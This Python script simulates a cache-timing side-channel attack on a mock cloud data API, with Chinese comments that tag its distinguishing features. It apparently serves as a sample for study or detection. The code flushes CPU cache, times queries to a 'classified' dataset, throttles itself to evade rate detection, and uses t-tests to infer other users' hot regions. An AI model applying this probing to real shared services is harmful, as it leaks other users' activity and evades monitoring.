# malicious_side_channel_complete.py
import time
import numpy as np
import threading
import random
from collections import defaultdict  # 用于存储每个区域的响应时间测量
from datetime import datetime

# ==========================================
# 模拟环境 (Mock Environment)
# ==========================================
class MockDataClient:
    """模拟云平台的数据接口，包含模拟的缓存行为"""
    def __init__(self):
        # 模拟：'suspected_dense_region' 是热点数据，被缓存在内存中
        self.cached_regions = ['suspected_dense_region']  # 模拟缓存的区域

    def get_dataset(self, name, variables, latitude, longitude, time_date):
     
        # 模拟网络延迟和处理时间
        base_latency = 0.000150  # 150微秒 (非缓存，冷数据从磁盘读)
        
        # 检查是否命中模拟的"缓存"
        # 简单的逻辑：如果查询的是热点区域，响应时间极快
        is_cached = False
        if latitude[0] >= 38.0 and latitude[0] <= 38.5: # 对应 suspected_dense_region
            is_cached = True
            base_latency = 0.000040  # 40微秒 (缓存命中，内存读)
            
        # 模拟真实的抖动 (Jitter)
        jitter = random.normalvariate(0, 0.000005) # 5微秒的标准差
        actual_delay = max(0, base_latency + jitter)  # 确保延迟非负
        
        time.sleep(actual_delay)  # 模拟网络延迟
        return "Simulated Data Chunk"

# ==========================================
# 侧信道攻击者类
# ==========================================
class SideChannelAttacker:
    def __init__(self):
        self.data_client = MockDataClient()  # 模拟数据客户端
        self.timing_measurements = defaultdict(list)  # 存储每个区域的响应时间测量
        self.cache_probe_array = None  # 缓存探测数组
        # [特征1] 巨大的数组分配，用于清空CPU缓存 (L3 Cache通常几十MB)
        self.prime_size = 64 * 1024 * 1024  # 64MB （用于清空缓存） 
        self.probe_array_size = 4096  # 缓存探测数组大小
        self.sample_count = 500  # 采样次数
        # [特征2] 使用高精度计时器
        self.high_res_timer = time.perf_counter_ns  # 高精度计时器

    def setup_cache_probe(self):
        """设置用于缓存状态探测的数组"""
        print(f"[+] [Setup] Allocating {self.prime_size/1024/1024}MB buffer for cache flushing...")
        self.prime_array = np.zeros(self.prime_size, dtype=np.uint8)  # 用于清空缓存的数组  uint8：8位无符号整数，范围0-255
        self.cache_probe_array = np.zeros(self.probe_array_size, dtype=np.uint64)  # 缓存探测数组  uint64：64位无符号整数，范围0-2^64-1

    def flush_cache(self):
        """
        [特征3] 缓存清洗操作
        攻击者通过遍历大数组，强制将CPU缓存中的其他用户数据'挤'出去
        """
        # 简单的步长访问，确保覆盖缓存行
        for i in range(0, self.prime_size, 4096): 
            self.prime_array[i] += 1

    def timing_attack_on_data_access(self):
        """对数据访问模式进行计时攻击"""
        target_dataset = "classified_submarine_data_v1"
        print(f"[+] [Attack] Starting timing analysis on dataset: {target_dataset}")
        
        # 定义探测目标：包含一个公开区域，一个怀疑是敏感热点的区域
        test_regions = [
            ('public_region', {'lat': (30.0, 35.0), 'lon': (120.0, 125.0)}),  # 公开区域（缓存命中）
            ('suspected_dense_region', {'lat': (38.0, 38.5), 'lon': (121.5, 122.0)}), # 假设这是我们要探测的敏感区
            ('sparse_region', {'lat': (10.0, 10.5), 'lon': (130.0, 130.5)})  # 稀疏区域（缓存未命中）
        ]
        
        for region_name, bbox in test_regions:
            print(f"    -> Probing {region_name}...")
            
            for i in range(self.sample_count):  # 每个区域采样sample_count次
                try:
                    # 1. (可选) 攻击者可能会先清空缓存，建立基线
                    self.flush_cache() 
                    
                    # 2. 测量查询时间
                    start_time = self.high_res_timer()
                    
                    # 执行API调用（模拟不同情况下的延迟）
                    _ = self.data_client.get_dataset(
                        name=target_dataset,  # 目标数据集
                        variables=['temp'],  # 变量列表
                        latitude=bbox['lat'],  # 纬度范围
                        longitude=bbox['lon'],  # 经度范围
                        time_date='2025-01-01'  # 时间日期
                    )
                    
                    end_time = self.high_res_timer()
                    query_time_ns = end_time - start_time
                    
                    self.timing_measurements[region_name].append(query_time_ns)  # 记录查询时间
                    
                    # [特征4] 随机微小延迟，规避简单的QPS检测
                    if i % 50 == 0:
                        time.sleep(0.001) 
                    
                except Exception as e:
                    print(f"Error: {e}")

    def statistical_analysis(self):
        """
        [特征5] 统计分析
        侧信道信号通常很微弱，需要统计学工具来验证显著性
        """
        print("\n[+] [Analysis] Performing statistical inference...")
        regions = list(self.timing_measurements.keys())
        
        # 计算基准（假设 public_region 是未缓存的冷数据基准）
        base_times = self.timing_measurements['public_region']
        base_mean = np.mean(base_times)
        
        print(f"    Baseline Latency (Public): {base_mean/1000:.2f} μs")
        
        from scipy import stats # 科学计算库常被用于恶意分析
        
        for region in regions:
            if region == 'public_region': continue  # 跳过当前迭代的剩余部分，直接进入下一次迭代。
            
            times = self.timing_measurements[region]
            current_mean = np.mean(times)
            
            # T-test 检验差异显著性
            t_stat, p_value = stats.ttest_ind(base_times, times, equal_var=False)
            
            print(f"    Target: {region}")
            print(f"      Mean Latency: {current_mean/1000:.2f} μs")
            print(f"      Difference: {(base_mean - current_mean)/1000:.2f} μs")
            print(f"      P-value: {p_value:.6e}")
            
            if p_value < 0.001 and current_mean < base_mean:
                print(f"      [!!!]ALERT：该区域显著更快")
                print(f"      [Inference] 数据可能已被其他用户缓存（高活动区域）")
            else:
                print(f"      [Inference] 访问时间正常")

def main():
    attacker = SideChannelAttacker()  # 初始化侧信道攻击类
    attacker.setup_cache_probe()  # 初始化缓存探测数组
    attacker.timing_attack_on_data_access()  # 执行计时攻击
    attacker.statistical_analysis()  # 执行统计分析
    print("\n[+] Attack sequence completed.")

if __name__ == "__main__":
    main()